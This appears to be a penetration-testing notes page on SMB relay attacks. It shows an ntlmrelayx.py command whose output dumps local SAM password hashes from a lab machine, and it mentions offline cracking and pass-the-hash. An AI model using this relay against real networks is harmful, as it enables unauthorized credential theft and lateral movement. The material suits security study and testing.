# SMB Relay

SMB Signing must be disabled on the target and the relayed user credentials must be for an administrator of the target machine.

{% hint style="info" %}
Disable SMB and HTTP servers in Responder Core\
/var/share/responder/Responder.conf
{% endhint %}

Utilise Impacket tool ntlmrelayx.py

```
kali@kali:~ $ ntlmrelayx.py -tf targets.txt -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Service RemoteRegistry is disabled, enabling it
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] Starting service RemoteRegistry
[*] SMBD-Thread-12 (process_request_thread): Connection from PLANETEXPRESS/HCONRAD@192.168.56.110 controlled, attacking target smb://192.168.56.111
[*] Target system bootKey: 0x3d0ed5dff6ff9dbe61a18203b6d4d74b
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a69c63bcd64b3e8cda4ae4d8a922b654:::
Phillip J. Fry:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
hconrad:1002:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.56.109
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
...
```

This SAM dump allows for offline ntlm password cracking, or a potential pass-the-hash attack.
